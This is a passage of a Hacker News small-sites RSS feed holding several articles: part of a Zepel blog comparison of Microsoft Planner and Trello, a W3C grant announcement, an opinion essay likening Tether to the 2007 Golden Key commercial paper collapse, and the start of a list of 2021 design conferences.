href="https://zepel.io/integrations/bitbucket/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">Bitbucket</a>, or <a href="https://zepel.io/integrations/gitlab/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">GitLab</a>.</li><li>Can not be used as a full-fledged <a href="https://zepel.io/agile-tools/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">agile project management tool</a>.</li><li>Doesn’t have the ability to set dependency between tasks.</li><li>Does not have kanban board templates.</li><li>Since it is part of the Office 365 suite of products, you’ll end up paying for plenty of tools you’ll not be using.</li></ul><hr><h2 id="trello-a-quick-overview">Trello: A quick overview</h2><p>Trello is a popular project collaboration tool that I’m sure you’ve heard from your friends before. It rose to popularity thanks to its simplicity and ease of use.</p><figure><img src="https://zepel.io/blog/content/images/2020/12/trello-board.png" alt="Trello board - MS Planner alternative for small teams" srcset="https://zepel.io/blog/content/images/size/w600/2020/12/trello-board.png 600w, https://zepel.io/blog/content/images/size/w1000/2020/12/trello-board.png 1000w, https://zepel.io/blog/content/images/size/w1600/2020/12/trello-board.png 1600w, https://zepel.io/blog/content/images/2020/12/trello-board.png 1999w" sizes="(min-width: 720px) 720px"><figcaption>Trello Board</figcaption></figure><p>Unlike other <a href="https://zepel.io/blog/free-project-management-software/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">online project management software</a>, Trello focuses on doing only one thing and trying to do it well — Board. With this tool, you do not get other views like list, Gantt, or calendar. But the good news is, you can use their “power-ups” to get these capabilities.</p><p>The tool can be used for several use cases ranging from event planning to collaborate with your development team. It doesn’t have even a basic reporting capability that others have. However, this software does give you a real-time activity feed of what’s happening within your team.</p><p>It has a huge list of integration that you can use to connect to the tools you already use every day.</p><h3 id="key-features-in-trello">Key Features in Trello</h3><ul><li>Boards</li><li>Content-rich cards</li><li>Customizable workflows</li><li>Power-ups that gives you more capabilities and views such as calendar or Gantt charts.</li><li>Public APIs.</li><li>Integration with 100+ tools like GitHub, Bitbucket, GitLab, Dropbox, Slack, and more.</li><li>Traditional project management features like assignees, due dates, labels, description, comments, attachments, and more.</li></ul><h3 id="trello-pricing">Trello Pricing</h3><figure><img src="https://zepel.io/blog/content/images/2020/12/trello-vs-asana-trello-pricing.png" alt="Pricing comparison Microsoft Planner vs Trello" srcset="https://zepel.io/blog/content/images/size/w600/2020/12/trello-vs-asana-trello-pricing.png 600w, https://zepel.io/blog/content/images/size/w1000/2020/12/trello-vs-asana-trello-pricing.png 1000w, https://zepel.io/blog/content/images/size/w1600/2020/12/trello-vs-asana-trello-pricing.png 1600w, https://zepel.io/blog/content/images/2020/12/trello-vs-asana-trello-pricing.png 2260w" sizes="(min-width: 720px) 720px"><figcaption>Trello pricing</figcaption></figure><p>Trello’s pricing is simple to understand. You’ve got three plans to pick from:</p><p><strong>1. Free</strong> - $0 per user per month</p><p>The free plan lets you collaborate with an unlimited number of members but restricts you on the features you can use.</p><p>It includes:</p><ul><li>10 Boards per team</li><li>10 MB limit on a file attachment</li><li>1 Power-up per board</li><li>Colored labels</li></ul><p><strong>2. Business Plan</strong> - $12.50 per user per month when paid monthly.</p><p>It includes:</p><ul><li>Unlimited boards</li><li>Advanced checklists</li><li>250 MB limit on a file attachment</li><li>Unlimited Power ups</li><li>Calendar view</li><li>Gantt view</li></ul><p><strong>3. Enterprise</strong> - $17.50 per user per month when paid monthly.</p><p>It includes:</p><ul><li>Everything from Business Class plan, plus</li><li>SAML SSO</li><li>Power-up administration</li><li>Public board management</li></ul><p>As you can see, Trello’s pricing is a lot simpler compared to MS Planner. However, it can feel a bit too pricey for the features and capabilities you get out of it.</p><h3 id="pros-of-using-trello">Pros of using Trello</h3><ul><li>Effortless to get started. Does not require you to add a credit card to get started.</li><li>The tool is fast, responsive, and does not have bloat that can slow down the software as your team uses it.</li><li>The user interface is intuitive and there will hardly be a moment where you’ll wonder how to do something within the app.</li><li>Unlike other tools, they provides an unlimited number of checklists and subtasks that you can add to your card.</li><li>Has several <a href="https://zepel.io/blog/9-kanban-board-examples/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">kanban board templates</a> that you can use for inspiration.</li><li>Allows you to @ mention people in comments to get their attention.</li><li>Has real-time activity feed that shows you a timeline of all the events that happened.</li><li>Includes several integrations including Slack, Dropbox, Box, Onenote, Google Drive, Salesforce, and more.</li><li>Power-ups help you to pick and choose the capabilities you want for your team. This helps reduce bloat.</li><li>It’s easy to see who’s doing what and track progress of tasks in one glance.</li></ul><h3 id="cons-of-using-trello">Cons of using Trello</h3><ul><li>As your company grows, this software rarely scales with you. You’ll run into missing features and make it harder for your employees to stay productive.</li><li>Lacks a calendar view that can only be used if you’re on a higher paid plan.</li><li>Can not be used as a <a href="https://zepel.io/blog/scrum-tools/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">scrum tool</a> since it lacks capabilities such as user stories, estimation points, and agile reports or even a simple way to visualize progress.</li><li>Can be used as a <a href="https://zepel.io/features/scrum-board/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">scrum board</a>, but only partially due to its lack of certain scrum related features.</li><li>Limited to only 250 MB on file attachments and uploads.</li><li>Lacks exporting option on the free plan.</li><li>Lacks <code>/</code> commands to make easier for teams to get started.</li><li>Does not provide the ability to view all tasks and subtasks in a single, hierarchical view.</li><li>Limited sorting and grouping in “My Tasks”.</li></ul><hr><h2 id="alternatives-to-microsoft-planner-and-trello">Alternatives to Microsoft Planner and Trello</h2><p>Still can’t make up your mind?</p><p>If you’re still not sure which to choose between Trello vs Planner, there are several alternatives that you should consider.</p><p>Below, we’ve listed 4 alternatives to help you decide.</p><h3 id="1-zepel">1. Zepel</h3><p><a href="https://zepel.io/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">Zepel</a> is a simple project management software used by several development teams. It comes with a wide range of capabilities that growing organizations would find it missing in either MS Planner or Trello.</p><figure><img src="https://zepel.io/blog/content/images/2021/01/zepel-boards.png" alt="Kanban Boards in Zepel - Alternative to MS Planner and Trello" srcset="https://zepel.io/blog/content/images/size/w600/2021/01/zepel-boards.png 600w, https://zepel.io/blog/content/images/size/w1000/2021/01/zepel-boards.png 1000w, https://zepel.io/blog/content/images/2021/01/zepel-boards.png 1200w" sizes="(min-width: 720px) 720px"><figcaption>Kanban Boards in Zepel</figcaption></figure><p>Zepel helps you capture customer feedback from several tools (<a href="https://zepel.io/guide/streams/sources-catalog/intercom/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">Intercom</a>, <a href="https://zepel.io/guide/streams/sources-catalog/zendesk/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">Zendesk</a>, <a href="https://zepel.io/guide/streams/sources-catalog/sentry/?utm_source=zepelblog&amp;utm_medium=text&amp;utm_campaign=microsoft-planner-vs-trello">Sentry</a>, and more), prioritize them, and track its development progress. It can support …</p></div></section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://zepel.io/blog/microsoft-planner-vs-trello/">https://zepel.io/blog/microsoft-planner-vs-trello/</a></em></p>]]>
            </description>
            <link>https://zepel.io/blog/microsoft-planner-vs-trello/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683990</guid>
            <pubDate>Fri, 08 Jan 2021 12:32:48 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: A lean HTML editor with instant preview]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25683798">thread link</a>) | @mg
<br/>
January 8, 2021 | https://no-gravity.github.io/html_editor/ | <a href="https://web.archive.org/web/*/https://no-gravity.github.io/html_editor/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://no-gravity.github.io/html_editor/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683798</guid>
            <pubDate>Fri, 08 Jan 2021 12:06:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[W3C receives grant to help guide open web design principles]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25683743">thread link</a>) | @rbanffy
<br/>
January 8, 2021 | https://www.grantfortheweb.org/blog/w3c | <a href="https://web.archive.org/web/*/https://www.grantfortheweb.org/blog/w3c">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><figure><p><img src="https://assets.website-files.com/5d714d264df04f253578055c/5ff3b63056af3d1c76f17508_Screen%20Shot%202021-01-04%20at%204.42.42%20PM.png" loading="lazy" alt=""></p></figure><p>We are excited to announce that Grant for the Web has awarded the World Wide Web Consortium (W3C) a $268,700 USD grant to help ensure that the Grant for the Web program, grantees, and community shape an emerging Web Monetization ecosystem favorable to open standardization. Grant for the Web is a program funded and led by Coil, working in collaboration with founding collaborators Mozilla and Creative Commons.</p><p>Various important aspects of web technology development including privacy, security, internationalization, accessibility, and interoperability are often overlooked in ways that can delay successful global scaling and lessen their societal impact.&nbsp; The Grant for the Web project will link&nbsp; experts in these capabilities with both the Grant for the Web Program Team and its grantees to advise on the best approaches to incorporating open web design principles.&nbsp;</p><blockquote>“W3C is excited to partner with Grant for the Web to help contribute to a process that is accessible, international and secure as well as to learn the perspectives of the platform creators.”&nbsp;– Jeff Jaffe, CEO, W3C<br></blockquote><p>W3C will use this award to allow staff to liaise with grantees and Program Team and also to reach new global audiences for the&nbsp; idea of Web Monetization.$25K&nbsp; in&nbsp; Inclusion Grants will&nbsp; underwrite new W3C memberships to support diversity, inclusion, and equity in the Web Monetization ecosystem and in the broader web standards movement.</p><p>“W3C and Grant for the Web are committed to getting more heads, hearts, and minds involved in building new business models on the web. We believe that Web Monetization has the opportunity to start to decentralize privilege and power and expand financial inclusion. But to do that we need those voices involved at the standards and design level. Together we are taking a step forward to link communities into the process.” Chris Lawrence, Senior Program Manager, Grant for the Web<strong><em>‍</em></strong></p><p>W3C will advise the Grant for the Web collaborating partners Coil, Mozilla, and Creative Commons on how the program can better strengthen our championing of web standards in our policies and practices. For further detail, see our <a href="https://www.grantfortheweb.org/faq">FAQ</a> and <a href="https://www.grantfortheweb.org/signup">sign up for our mailing list</a> to ensure you get updates about future grant opportunities.&nbsp;</p><p><strong><em>About </em></strong><a href="https://www.w3.org/"><strong>The World Wide Web Consortium</strong></a><strong><em> </em></strong>(W3C) is led by<a href="https://www.w3.org/People/Berners-Lee"> Tim Berners-Lee</a>, inventor of the World Wide Web and Director, and<a href="https://www.w3.org/People/Jeff/"> Dr. Jeffrey Jaffe, W3C CEO</a>. They are supported by a<a href="https://www.w3.org/People/all"> staff</a> of technical experts who help coordinate technology development and manage the operations of the Consortium. The W3C achieves its<a href="https://www.w3.org/Consortium/mission"> mission</a> by bringing diverse stakeholders together, under a clear and effective consensus-based process to develop<a href="https://www.w3.org/standards/"> high-quality standards</a> based on contributions from the W3C Members, staff, and the community at large. In administrative terms: W3C is administered via a joint agreement among these "Host Institutions":<a href="http://www.csail.mit.edu/"> MIT</a> ,<a href="http://www.ercim.org/"> ERCIM</a> ,<a href="http://www.keio.ac.jp/"> Keio University</a>, and<a href="http://ev.buaa.edu.cn/"> Beihang University</a>. The<a href="https://www.w3.org/People/"> W3C staff</a> (many of whom work physically at one of these institutions) is led by a Director and CEO. A<a href="https://www.w3.org/People/domain?domain=Management"> management team</a> is responsible for resource allocation and strategic planning on behalf of the staff. The<a href="https://chapters.w3.org/"> W3C Chapters</a> play an important role in W3C being an<a href="https://www.w3.org/Consortium/facts#international"> international organization</a>.&nbsp;</p><p>‍<strong><em>About</em></strong><a href="https://webmonetization.org/"><strong><em> Web Monetization</em></strong></a><strong><em> –</em></strong> Web Monetization is a proposed API standard that allows websites to request a stream of very small payments (e.g. fractions of a cent) from a user. In exchange for payments from the user, websites can provide the user with a “premium” experience, such as allowing access to exclusive content, removing advertising, or even removing the need to log in to access content services.<strong><em>‍</em></strong></p><p>‍<strong><em>About </em></strong><a href="https://www.grantfortheweb.org/"><strong><em>Grant for the Web</em></strong></a><strong><em> – </em></strong>Grant for the Web is a $100 million fund that enables content creators and software developers to adopt and advance Web Monetization and the Interledger Protocol: open-source tools for better, alternative online business models that benefit the public good. Grant for the Web is funded and led by Coil, working in collaboration with founding collaborators Mozilla and Creative Commons.<a href="https://www.grantfortheweb.org/charter"> <strong>GftW Charter</strong></a>.</p><p>‍</p></div></div>]]>
            </description>
            <link>https://www.grantfortheweb.org/blog/w3c</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683743</guid>
            <pubDate>Fri, 08 Jan 2021 11:58:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tether: Heads I win, tails you lose]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25683601">thread link</a>) | @SarunasB
<br/>
January 8, 2021 | http://www.tr0lly.com/uncategorized/tether-heads-i-win-tails-you-lose/ | <a href="https://web.archive.org/web/*/http://www.tr0lly.com/uncategorized/tether-heads-i-win-tails-you-lose/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">

	<section id="primary">
		<main id="main">

			
<article id="post-509">
	
	<div>
		
<p>Tether is the entity that issues and manages the USDT stablecoin. The “entity” wording is key: although Tether is incorporated as a Hong Kong company, its <a href="https://thecaspiancey.medium.com/finding-finex-3eefac0d45a2">offices don’t seem to exist at the filing address</a>, its CEO and CFO are M.I.A., and the bulk of communication is performed by its CTO, Paolo Ardoino.</p>



<p>USDTs are crucially important to the crypto ecosystem. Pegged 1:1 to the US dollar, they enable instantaneous transfers of huge sums of money between industry players, without having to explain to a bank what you’re doing. USDTs are, for all practical purposes, almost like money.</p>



<p>Until they aren’t.</p>



<h2>Golden Key Ltd.</h2>



<p>In the history of things that are “almost like money”, allow me to introduce asset backed securities (ABS). In the 2000s real estate boom, those were particularly popular, because they allowed to create fiat money without having to comply with banking regulations.</p>



<p>Imagine that it’s 2006, you work at a US-based bank, and you want to give a mortgage to Tom. Tom has no job, no assets, and a passion for face tattoos, but he really wants to buy that condo in downtown Philly, and you really want to give him a mortgage because then you’ll collect your fee. If you were a traditional banker, you wouldn’t give Tom a mortgage because then this mortgage would sit on your balance sheet and burn a hole in it when Tom’s new condo goes up in flames because cooking meth is dangerous. But if you’re a modern, 21st century banker, you know that you don’t have to keep that mortgage on your books. You can securitize it – bundle it together with a bunch of other mortgages, and post this bundle as collateral for a whole new security, which investors from Dusseldorf, Germany will buy at face value because they think they’re sophisticated and must invest in sophisticated things.</p>



<p>That’s how ABSs came into existence – new securities, fully <strong>backed</strong> by <strong>assets</strong> (hence the “A” and “B” in the name), that you could structure to look like anything – 30 year bonds, or money market instruments. They had cool sounding names, too. Like Golden Key.</p>



<h3>Asset Backed Commercial Paper</h3>



<p>Commercial Paper is a short term bond (less than 365 days in maturity) issued by a commercial entity – a bank, a governmental institution, a corporation like Coca Cola. They are the bread and butter of money market funds, because you are allowed to price them linearly when their maturity is less than 90 days, making your fund’s performance look very smooth.</p>



<p>Asset Backed Commercial Paper (ABCP), on the other hand, is issued by a Special Purpose Vehicle (SPV), a shell company with no real activity. Because nobody would lend money to a shell company with no real activity, its commercial paper is <strong>backed</strong> by <strong>assets</strong> (“A” and “B” again). The SPV is regularly audited, and investors are confident that the SPV is properly collateralised, and lend it money by buying its ABCP. The full beauty of it, is that by funding your SPV in the money markets, taking out short term loans, while backing it with long term, illiquid assets, you keep the liquidity and term premiums for yourself, without pesky banking regulators knocking on your door. The SPVs look like banks, but aren’t. That’s why they quickly became known as part of “shadow banking”.</p>



<p>SPVs were usually managed by real banks, because banks know how to do all this structurisation and hedging and commercial paper issuance and marketing and rating stuff. Golden Key, for instance, was managed by Barclays. And it had a stellar P-1 rating, which is the “AAA” equivalent for commercial paper. This P-1 rating made it eligible for the largest and well-known money market funds, and those funds bought Golden Key ABCPs hand over fist, funding its underlying portfolio of assets.</p>



<p>Barclays was acting as a broker for Golden Key, meaning that it was responsible for buying assets on the market and sell it to the SPV, so that the SPV had assets to back its ABCP.</p>



<h3>Almost like money</h3>



<p>For a couple of years, Golden Key acted like a savings account, paying good interest. Not stellar interest, because it was very low risk, but fair interest nonetheless – something like 3 month Euribor plus 3-4 basis points. Which, for a P-1 rated ABCP, was a good margin at the time. Not a stellar margin, but a fair margin nonetheless. Money market fund managers would roll it every three months, meaning that they would reinvest money into the same ABCP as it came due.</p>



<p>It was such a dull, boring job that money market fund managers usually left their jobs before noon to get lunch and wouldn’t check back in until the next morning. Come in at 8 a.m., roll the commercial paper that’s coming due in two days before 9 a.m., and then bore yourself to death, day after day.</p>



<p>It was so widely accepted that these ABCPs were dull boring things, that the day when Golden Key suddenly blew up, nobody could even find the prospectus for the ABCP (meaning the set of documents that describe how it works, and what kind of assets back it). It took hours of frantic calls to brokers and lawyers in the Cayman Islands to get these hundred-page-long legalese page-turners.</p>



<h3>Fiduciary duty? lol</h3>



<p> For years, i.e. for as long as money market fund managers were reinvesting their fund into the same ABCP and nobody needed to cash out, Golden Key acted like a saving account. But, the moment the first market tremors of the 2007 ABS crash began to rumble, Golden Key went bust.</p>



<p>You remember how Barclays was supposed to act as broker for Golden Key, meaning that it would buy something on the market, and sell it to the SPV at the same price? Well, Barclays did just that – but <strong>not on the same day</strong>. It wasn’t explicitly written in the ABCP prospectus that both legs of the trade needed to be performed within a certain time period. So, when markets began to go south, Barclays went through its books, and sold to Golden Key the worst of their crap, at prices it had bought that crap <strong>months ago</strong> – basically, at par. Good-bye losses, hello year-end bonus!</p>



<p>And they got away with it. Why wouldn’t they? Caveat emptor, suckers! Money market fund managers had assumed that something was safe and sound because it looked that way for a long time, and because it was convenient for them. And they got caught with their pants down.</p>



<h2>Tether</h2>



<p>What you need to understand in the case of Golden Key, is that it all looked so very legit. The ABCP had a stellar credit rating from Moody’s. It was managed by Barclays. Its accounts were audited. It was traded by the largest money market funds in the world. It was governed by hundreds of pages of legalese. You could see it on your Bloomberg terminal. It was so, so very legit and backed by assets and worth 100% until it wasn’t. Billions of dollars that you thought were yours, became somebody else’s.</p>



<p>Fast forward thirteen years, and now you have Tether and USDT. 22 billion almost dollars governed by a five-page disclaimer that USDTs are backed by whatever Tether wants, at whatever valuations Tether finds convenient. No credit rating, no bank, no auditor, no offices, no CEO and CFO, no guarantee whatsoever.</p>



<h3>Backed by reserves</h3>



<p>The whole angle of attack of Tether sceptics is that USDTs aren’t backed by US dollars. This would mean that Tether can print USDTs out of thin air, for as long as USDT bagholders believe that their coins are legit, and don’t try to sell.</p>



<p>Tether, and most of the crypto community, contest that claim, or at least try to deflect it. USDTs are very convenient, because they allow everyone to bypass banks and their AML and KYC regulations. You know, very much like ABSs allowed to bypass capital requirement regulations. And USDTs have looked like real money for such a long time, why not assume that they will continue to look like money in the future, too?</p>



<h3>Rug pull, sucker</h3>



<p>I don’t believe that USDTs are backed, but I also don’t know that they’re not. So let’s play devil’s advocate and assume that there are indeed 22 billion of real US dollars hidden somewhere in bank accounts, controlled by Tether.</p>



<p>When people try to cash out en masse, i.e. redeem their USDTs for real money, why would Tether allow them to do so? 22 billion dollars is a lot of real money. Why give it up? Tether’s own website says they don’t have to. Seriously, I’m not making this up:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-08-at-11.22.11.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-08-at-11.22.11.png 777w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-08-at-11.22.11-300x80.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/01/Screen-Shot-2021-01-08-at-11.22.11-768x205.png 768w" sizes="(max-width: 777px) 100vw, 777px"><figcaption>source: tether.to/legal</figcaption></figure>



<p>Why should Tether spend all its money (it is theirs, after all – USDT holders don’t have a legal claim on Tether’s reserves) trying to save the crypto markets, when they collapse? How many years would it take them to rebuild their war chest, assuming that crypto bounces back? Paolo Ardoino will be old and sick by then. Why not party on a yacht in Monaco for the rest of his life instead?</p>



<p>If USDTs become worthless, it’s the end of the crypto ecosystem. A lot of Bitcoin investors have USDTs in their portfolios, too. If Tether collapses, and redemption requests hit, they’ll have to sell whatever they can. Except there won’t be any exchanges left, for most can’t function without USDTs, and the rest (like Coinbase) will crumble under the tsunami of requests, and there won’t be any bids left. Other stablecoins will collapse, too, as holders rush for the exits.</p>



<p>Caveat emptor.</p>
	</div><!-- .entry-content -->

	<!-- .entry-footer -->

			
</article><!-- #post-${ID} -->

	<nav role="navigation">
		<h2>Post navigation</h2>
		
	</nav>
<!-- #comments -->

		</main><!-- #main -->
	</section><!-- #primary -->


	</div></div>]]>
            </description>
            <link>http://www.tr0lly.com/uncategorized/tether-heads-i-win-tails-you-lose/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683601</guid>
            <pubDate>Fri, 08 Jan 2021 11:29:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UX and design conferences to attend in 2021]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25683578">thread link</a>) | @tdahm
<br/>
January 8, 2021 | https://www.neonmoire.com/announcement/21-design-conferences-to-attend-in-2021 | <a href="https://web.archive.org/web/*/https://www.neonmoire.com/announcement/21-design-conferences-to-attend-in-2021">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p><span id="3f3T3rTQRmPSaltmm802n5"><div><p>This year we added to the conference information: Online, Hybrid, or In-person. Because we assume that you want to know before buying a ticket if you can attend the event from home or have to book a flight and hotel/Airbnb as well. Like it was before 2020.<br>We can not guarantee that all the listed in-person events will take place. There are just too many uncertainties due to the global pandemic. Why did we include them in this list? Because based on their past track record, we know that the organizers will do everything in their power to give you an unforgettable inspiring experience.<br>By hybrid I mean, the local community attends the in-person version of an event and the international audience will watch the stream. Both watch the same recorded or live talk! Online means a live-stream of recorded or live presentations that you can watch from home on any device.</p>
<p>During the coming month's some of the listed events may be postponed or canceled. So if you want to stay up-to-date <a href="http://eepurl.com/dCPqZ1" title="sign up for the Neon Moiré weekly newsletter" target="_blank">sign up for our weekly newsletter</a> where we share all things related to design-driven conferences and have exclusive discounts and giveaways.</p>
<p>If you prefer to have all conferences show up in your calendar, you can buy our <a href="https://gumroad.com/neonmoire#ZIDum" title="2021 design conference database" target="_blank">2021 design conference database as an iCal file</a>. Which works with all calendaring software. We will update it regularly, thought out the year. By buying this you support or work.</p>
</div></span></p><p><span id="2thEnqU1yhfhUKr0iNgKWT"><div><h2>How to decide where to go?</h2>
<p>When we attend an event we consider the speakers, the location, the ticket price, the event’s track record, and don’t forget the attendee list. Which before online events weren't shared that often, but is now a must. We also look if there are interesting workshop and network events, before, during, or after the conference. Pre-pandemic a bonus for us was attending locally organized side events and interesting exhibitions to visit.</p>
</div></span></p><p><span id="304hvUxitBOxY3VD6d9FDg"><div><h2><a href="https://designmatters.jp/en/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="Design Matters Tokyo" target="_blank">Design Matters Tokyo</a></h2>
<p>Design Matters is a global community of digital creatives who love to explore and inspire each other to break new ground in digital design. The second edition of this digital design conference is hosting 23 talks along with a variety of workshops and social activities. The conference themes are 'Danish Design Attitude' and 'New Movements in Digital Design'.</p>
<ul>
<li>When: 27 - 28 Jan 2021</li>
<li>Where: Hybrid / Tokyo, Japan</li>
<li>Ticket price: $165 - $495</li>
</ul>
<h2><a href="http://www.graphikamanila.com/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="Graphika" target="_blank">Graphika</a></h2>
<p>The sixteenth edition of Graphika, Asia's most influential creative conference takes place online. This two-day event host 10 of the world's top creative people. Including Austin Keen and Yuko Shimizu. Broadcasting from Manilla in the Philippines, Graphika streams their event in two timezones, from 1PM-7PM in Asia (GMT+8), with replays from 1PM-7PM in USA Eastern Time (EST UTC-5). All content will be available till 60days after the conference.</p>
<ul>
<li>When: 6 - 7 Feb 2021</li>
<li>Where: Online</li>
<li>Ticket price: $33</li>
</ul>
<h2><a href="https://www.museumnext.com/events/digital-museum-summit/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="MuseumNext Digital Summit" target="_blank">MuseumNext Digital Summit</a></h2>
<p>The MuseumNext Digital Summit is a five-day online event for museums looking for digital success. The Digital Summit offers you a huge program of talks with more than sixty speakers sharing their ideas, experiences, and innovations. All content will be available for six months after the event!</p>
<ul>
<li>When: 22 - 26 Feb 2021</li>
<li>Where: Online</li>
<li>Ticket price: £120 - £240</li>
</ul>
<h2><a href="https://leadingdesign.com/conferences/festival-2021?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="Leading Design Festival" target="_blank">Leading Design Festival</a></h2>
<p>This new festival spends the whole month of March. It hosts design leadership activities including a three-day conference, weekly talks, masterclasses, mentoring sessions, and a host of other events. Conference speakers include Temi Adeniyi, UX Lead at Shopify, Julie Zhuo, Co-founder of Inspirit, and Noah Levin, Design Director at Figma.</p>
<ul>
<li>When: 2 - 25 Mar 2021</li>
<li>Where: Online</li>
<li>Ticket price: $395 - $745</li>
</ul>
<h2><a href="https://elevate.at/en/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="Elevate Festival" target="_blank">Elevate Festival</a></h2>
<p>Elevate is an annual interdisciplinary festival held in various venues in Graz, Austria, with a strong focus on cultural and socio-political topics.<br>In addition to performances, concerts, installations and DJ sets, the interdisciplinary program offers workshops, film screenings, lectures and discussions.</p>
<ul>
<li>When: 3 - 7 Mar 2021</li>
<li>Where: In-person / Graz, Austria</li>
<li>Ticket price: TBA</li>
</ul>
<h2><a href="https://www.huiputfestival.fi/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="Huiput Creative Festival" target="_blank">Huiput Creative Festival</a></h2>
<p>Huiput Creative Festival offers new ideas and perspectives in a one-day virtual event. The event brings together Finnish and foreign forerunners in various creative practices to share their knowledge and inspirations. The festival's theme is CHANGE.</p>
<ul>
<li>When: 4 Mar 2021</li>
<li>Where: Online</li>
<li>Ticket price: €90</li>
</ul>
<h2><a href="https://danikomunikacija.com/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="DK Festival" target="_blank">DK Festival</a></h2>
<p>This 3-day advertising festival invites the most exciting makers to take their round stage and talk about what is going on in the world today.</p>
<ul>
<li>When: 15 - 18 Apr 2021</li>
<li>Where: In-person / Rovinj, Croatia</li>
<li>Ticket price: 2999 HRK + vat</li>
</ul>
<h2><a href="https://forward-festival.com/vienna/overview?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="Forward Festival Vienna" target="_blank">Forward Festival Vienna</a></h2>
<p>Forward Festival 2021 is all about the transformation of society through digitization in the creative scene. It raises questions about the virtualization of our lives and our work, especially during the 'new normal'. Forward Festival wants to be an eye-opener to the striking aspects of digitization – applied to design, creativity, and communication.</p>
<ul>
<li>When: 15 - 16 Apr 2021</li>
<li>Where: Hybrid / Vienna, Austria</li>
<li>Ticket price: €85 - €199</li>
</ul>
<h2><a href="https://offf.barcelona/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="OFFF Barcelona" target="_blank">OFFF Barcelona</a></h2>
<p>20th edition of OFFF Barcelona! Born as a post-digital culture festival, now feeding the future through a 3-day design conference, workshops, and performances by the most relevant artists of our time. OFFF hosts innovative and international talents to share their insightful experiences. It’s the key meeting point for all talents around the world to unite and collaborate.</p>
<ul>
<li>When: 6 - 8 May 2021</li>
<li>Where: In-person / Barcelona, Spain</li>
<li>Tickets: Sold out!</li>
<li>Related interview: <a href="https://www.neonmoire.com/interview/20-years-offf-barcelona" title="20 Years OFFF Barcelona with Hector Ayuso and Nathalie Koutia" target="_blank">20 Years OFFF Barcelona with Hector Ayuso and Nathalie Koutia</a></li>
</ul>
<h2><a href="https://frombusinesstobuttons.com/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="From Business to Buttons" target="_blank">From Business to Buttons</a></h2>
<p>Scandinavia’s premier User Experience and Service Design conference. It is a meeting place for everyone who wants inspiration, and hands-on advice, on how to generate business value by creating great experiences.</p>
<ul>
<li>When: 7 May 2021</li>
<li>Where: Online</li>
<li>Ticket price: €899</li>
</ul>
<h2><a href="https://beyondtellerrand.com/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="beyond tellerrand Düsseldorf" target="_blank">beyond tellerrand Düsseldorf</a></h2>
<p>This is number 10! Ten editions of beyond tellerrand in Düsseldorf. Join beyond tellerrand to celebrate 10 years of creativity, inspiration, learning, and meeting with a lovely group of people each and every year.<br>Note: This event was originally planned for April 27th and 28th, 2020</p>
<ul>
<li>When: 10 - 12 May 2021</li>
<li>Where: In-person / Düsseldorf, Germany</li>
<li>Ticket price: TBA</li>
</ul>
<h2><a href="https://underconsideration.com/firstround/?utm_source=neonmoire&amp;utm_medium=article&amp;utm_campaign=21of21" title="Brand New: First Round" target="_blank">Brand New: First Round NYC</a></h2>
<p>A one-day showcase of original presentations made to clients showing initial design explorations for logo, identity, and branding projects. This New York event is the first in a series of in-person events happening in May and June of 2021. Cities that follow are London, Berlin, Madrid, Barcelona, and Amsterdam. In each city, the organizers invite the local leading brand agencies to showcase their original work.</p>
<ul>
<li>When: 14 May 2021</li>
<li>Where: In-person / Variuos locations</li>
<li>Ticket price: $125/£125/€125</li>
